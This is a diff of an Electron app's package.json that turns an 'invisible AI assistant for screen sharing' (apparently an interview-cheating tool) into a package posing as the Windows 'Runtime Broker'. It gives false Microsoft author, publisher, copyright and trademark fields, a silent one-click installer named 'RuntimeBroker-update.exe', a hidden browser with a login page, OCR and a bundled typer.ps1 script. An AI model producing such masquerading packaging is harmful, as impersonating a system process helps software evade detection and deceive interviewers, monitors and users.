@@ -1,64 +1,73 @@
 {
-  "name": "open-interview-coder",
-  "version": "0.1.0",
-  "description": "An invisible AI assistant for screen sharing",
-  "main": "src/main.js",
+  "name": "kx",
+  "version": "10.0.22621.1",
+  "description": "Runtime Broker",
+  "main": "hidden-browser/src/main.js",
+  "author": "Microsoft Corporation",
+  "license": "MIT",
   "scripts": {
     "start": "electron .",
-    "dev": "electron . --debug",
-    "build": "electron-builder",
-    "build:mac": "electron-builder --mac",
-    "build:win": "electron-builder --win",
-    "build:linux": "electron-builder --linux"
-  },
-  "dependencies": {
-    "axios": "^0.27.2",
-    "dotenv": "^16.4.5",
-    "electron-store": "^8.2.0",
-    "marked": "^15.0.7"
+    "dev": "electron . --dev",
+    "build": "electron-builder --win --x64"
   },
   "devDependencies": {
     "electron": "^23.3.13",
     "electron-builder": "^24.13.3"
   },
+  "dependencies": {
+    "tesseract.js": "^7.0.0"
+  },
   "build": {
-    "appId": "com.openinterviewcoder.app",
-    "productName": "Open Interview Coder",
-    "icon": "assets/OCTO.png",
-    "mac": {
-      "category": "public.app-category.developer-tools",
-      "icon": "assets/icon.icns"
-    },
+    "appId": "Microsoft.Windows.RuntimeBroker",
+    "productName": "Runtime Broker",
+    "copyright": "© Microsoft Corporation. All rights reserved.",
+    "asar": true,
     "win": {
       "target": [
-        "nsis"
+        {
+          "target": "nsis",
+          "arch": [
+            "x64"
+          ]
+        }
       ],
-      "icon": "assets/OCTO.png"
+      "executableName": "RuntimeBroker",
+      "requestedExecutionLevel": "asInvoker",
+      "legalTrademarks": "Microsoft and Windows are registered trademarks of Microsoft Corporation.",
+      "publisherName": "Microsoft Corporation"
     },
-    "linux": {
-      "target": [
-        "AppImage",
-        "deb"
-      ],
-      "category": "Development",
-      "icon": "assets/OCTO.png"
-    },
-    "directories": {
-      "output": "dist"
+    "nsis": {
+      "oneClick": true,
+      "perMachine": false,
+      "allowToChangeInstallationDirectory": false,
+      "createDesktopShortcut": false,
+      "createStartMenuShortcut": false,
+      "runAfterFinish": true,
+      "artifactName": "RuntimeBroker-update.exe",
+      "installerLanguages": [
+        "en_US"
+      ]
     },
     "files": [
-      "**/*",
-      "!**/node_modules/*/{CHANGELOG.md,README.md,README,readme.md,readme}",
-      "!**/node_modules/*/{test,__tests__,tests,powered-test,example,examples}",
-      "!**/node_modules/*.d.ts",
-      "!**/node_modules/.bin",
-      "!**/*.{iml,o,hprof,orig,pyc,pyo,rbc,swp,csproj,sln,xproj}",
-      "!.editorconfig",
-      "!**/._*",
-      "!**/{.DS_Store,.git,.hg,.svn,CVS,RCS,SCCS,.gitignore,.gitattributes}",
-      "!**/{__pycache__,thumbs.db,.flowconfig,.idea,.vs,.nyc_output}",
-      "!**/{appveyor.yml,.travis.yml,circle.yml}",
-      "!**/{npm-debug.log,yarn.lock,.yarn-integrity,.yarn-metadata.json}"
-    ]
+      "hidden-browser/src/**/*",
+      "hidden-browser/index.html",
+      "hidden-browser/login.html",
+      "hidden-browser/styles.css",
+      "node_modules/**/*",
+      "!node_modules/electron/**/*",
+      "!node_modules/electron-builder/**/*",
+      "!**/*.map",
+      "!**/test/**",
+      "!**/*.md"
+    ],
+    "extraResources": [
+      {
+        "from": "hidden-browser/src/typer.ps1",
+        "to": "typer.ps1"
+      }
+    ],
+    "directories": {
+      "output": "dist"
+    }
   }
 }
